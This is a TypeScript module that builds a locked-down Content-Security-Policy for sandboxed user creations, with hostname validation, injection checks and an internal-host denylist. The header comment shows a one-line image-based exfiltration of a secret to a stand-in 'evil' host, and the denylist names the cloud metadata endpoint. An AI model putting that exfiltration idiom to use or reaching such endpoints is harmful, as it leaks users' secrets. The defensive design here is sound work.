/**
 * Compile a creation's Content-Security-Policy from its declared network hosts.
 *
 * Two rules carry the whole design:
 *
 *  1. `script-src` is always `'self'` and is never influenced by the manifest.
 *     That is the mechanism that enforces vendoring. Without it, "everything is
 *     vendored" is a policy nobody checks.
 *
 *  2. Declared hosts reach `connect-src`, `img-src`, `media-src` and `font-src`.
 *     The `img-src` clause is not optional: `new Image().src = 'https://evil/?'
 *     + secret` needs no response to leak, so locking `fetch` alone leaves the
 *     exfiltration channel wide open.
 *
 * The result is compiled at publish time and frozen on the version row, then
 * served verbatim. It is never recomputed per request from the manifest,
 * because a human approved that exact string, and a mutable input to a reviewed
 * security decision is not a security decision.
 */

import type { Manifest } from '@townsquare/manifest'

/** Hosts that must never appear, regardless of what the manifest declares. */
const DENIED_HOST_SUFFIXES = [
  '.localhost',
  '.local',
  '.internal',
  '.home.arpa',
  '.onion',
  '.test',
  '.invalid',
]
const DENIED_HOSTS = new Set(['localhost', 'metadata.google.internal'])

/**
 * A dotted name whose final label is alphabetic.
 *
 * The alphabetic-TLD requirement is what rejects a bare IP literal. An earlier
 * version allowed digits in every label, so `127.0.0.1` parsed as a perfectly
 * good "hostname" and sailed past the loopback denylist, which only matched the
 * string `localhost`. Declaring an IP is never legitimate here and would let a
 * creation reach a private range the reviewer cannot resolve.
 */
const HOSTNAME = /^(?=.{1,253}$)([a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,63}$/

export class CspCompileError extends Error {}

/**
 * Reject anything that is not a plain lowercase ASCII hostname.
 *
 * The manifest schema already checks this. It is checked again here because
 * this function emits a security header, and a header builder that trusts its
 * caller is one refactor away from header injection. `;` or a space in a
 * "hostname" would let a declared value append its own directive.
 */
function assertSafeHost(host: string): void {
  if (host !== host.toLowerCase()) {
    throw new CspCompileError(`host must be lowercase: ${JSON.stringify(host)}`)
  }
  if (!HOSTNAME.test(host)) {
    throw new CspCompileError(`not a bare hostname: ${JSON.stringify(host)}`)
  }
  // Belt and braces over the regex: these are the characters that would let a
  // value break out of its directive.
  if (/[;,'"\s\\()*]/.test(host)) {
    throw new CspCompileError(`host contains forbidden characters: ${JSON.stringify(host)}`)
  }
  if (DENIED_HOSTS.has(host) || DENIED_HOST_SUFFIXES.some((s) => host.endsWith(s))) {
    throw new CspCompileError(`host is not allowed: ${host}`)
  }
}

export interface CompileCspOptions {
  /**
   * The shell origins allowed to frame this creation. Required.
   *
   * `'self'` is the wrong answer and was the original bug here: a creation is
   * framed by the *shell*, which lives on a different registrable domain by
   * design, so `frame-ancestors 'self'` means nothing can ever embed it. The
   * whole platform silently fails to load, and it fails at the browser rather
   * than anywhere a server log would show it.
   *
   * There is deliberately no default. A policy about who may frame you is not
   * something to guess.
   */
  shellOrigins: string[]
  /** Where CSP violation reports are sent. Omit to disable reporting. */
  reportUri?: string
}

/** `scheme://host[:port]`, and nothing else — no path, no wildcard, no space. */
const ORIGIN = /^https?:\/\/[a-z0-9.-]+(:[0-9]{1,5})?$/

function assertSafeOrigin(origin: string): void {
  if (!ORIGIN.test(origin)) {
    throw new CspCompileError(`not a bare origin: ${JSON.stringify(origin)}`)
  }
  if (/[;,'"\s\\()*]/.test(origin)) {
    throw new CspCompileError(`origin contains forbidden characters: ${JSON.stringify(origin)}`)
  }
}

/**
 * @returns the exact `Content-Security-Policy` header value to serve.
 */
export function compileCsp(manifest: Manifest, opts: CompileCspOptions): string {
  const hosts = [...new Set(manifest.permissions.network)].sort()
  for (const h of hosts) assertSafeHost(h)

  const ancestors = [...new Set(opts.shellOrigins)]
  if (ancestors.length === 0) {
    throw new CspCompileError('at least one shell origin is required for frame-ancestors')
  }
  for (const o of ancestors) assertSafeOrigin(o)

  // Every declared host is pinned to https. A creation cannot opt into cleartext,
  // which would expose residents on shared networks and is never necessary.
  const declared = hosts.map((h) => `https://${h}`)
  const withDeclared = (base: string[]): string => [...base, ...declared].join(' ')

  const directives: string[] = [
    // Deny everything, then re-grant narrowly. A directive we forget to name
    // therefore fails closed rather than inheriting something permissive.
    `default-src 'none'`,

    /*
     * The vendoring gate. The host list is never widened by the manifest, and
     * that — not the absence of `'unsafe-inline'` — is what enforces "everything
     * is vendored": no third-party origin can ever appear here, so no creation
     * can pull code at runtime.
     *
     * `'unsafe-inline'` IS allowed, and leaving it out was a real bug: a
     * single-file `index.html` with an inline `<script type="module">` is the
     * normal shape of a resident's creation and the near-universal shape of a
     * generated one. Without it, nothing runs at all.
     *
     * It costs nothing here. CSP's job in this frame is egress control, not
     * XSS hardening: the whole document is already untrusted code on its own
     * origin, so an attacker who can write inline script can equally write an
     * external one in the same bundle. There is no privilege between them.
     *
     * `'unsafe-eval'` stays denied, and that distinction is the one that
     * matters — eval is how you fetch a payload after approval and run
     * behaviour a reviewer never saw.
     */
    `script-src 'self' 'unsafe-inline'`,

    // 'unsafe-inline' for styles only. Generated apps use inline styles
    // constantly, and style injection inside an already-untrusted, already-
    // isolated frame buys an attacker nothing they do not already have.
    `style-src 'self' 'unsafe-inline'`,

    // data: for images is how generated code inlines small icons.
    withDeclared([`img-src 'self'`, 'data:']),
    withDeclared([`font-src 'self'`, 'data:']),
    withDeclared([`media-src 'self'`]),
    withDeclared([`connect-src 'self'`]),

    // A creation may not frame anything, and may not be framed by anyone but us.
    `frame-src 'none'`,
    `child-src 'none'`,
    `object-src 'none'`,

    // No plugins, no base tag rewriting, no form posts anywhere.
    `base-uri 'none'`,
    `form-action 'none'`,

    // Workers stay same-origin so they cannot become an unpoliced fetch context.
    `worker-src 'self'`,

    // Who may embed this creation. The shell, and nobody else — this is what
    // stops an external site framing a creation to clickjack it.
    `frame-ancestors ${ancestors.join(' ')}`,
  ]

  if (opts.reportUri) {
    if (/[;,\s]/.test(opts.reportUri)) {
      throw new CspCompileError('reportUri contains forbidden characters')
    }
    directives.push(`report-uri ${opts.reportUri}`)
  }

  return directives.join('; ')
}

/**
 * The hosts a creation is allowed to reach, for the reviewer's screen.
 *
 * Kept beside the compiler so the reviewer sees the same list the header
 * encodes rather than a separately-derived one that could drift.
 */
export function declaredHosts(manifest: Manifest): string[] {
  return [...new Set(manifest.permissions.network)].sort()
}
